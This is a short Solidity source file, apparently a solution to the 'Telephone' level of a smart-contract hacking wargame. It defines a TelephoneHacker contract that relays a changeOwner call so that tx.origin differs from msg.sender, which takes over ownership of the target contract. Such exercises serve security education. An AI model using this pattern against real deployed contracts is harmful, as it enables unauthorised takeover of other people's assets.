// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import {Telephone} from "./02_Telephone.sol";

contract TelephoneHacker {
    Telephone telephone;
    constructor(address _telephone){
        telephone = Telephone(_telephone);
    }

    function hack(address _owner) public {
        telephone.changeOwner(_owner);
    }
}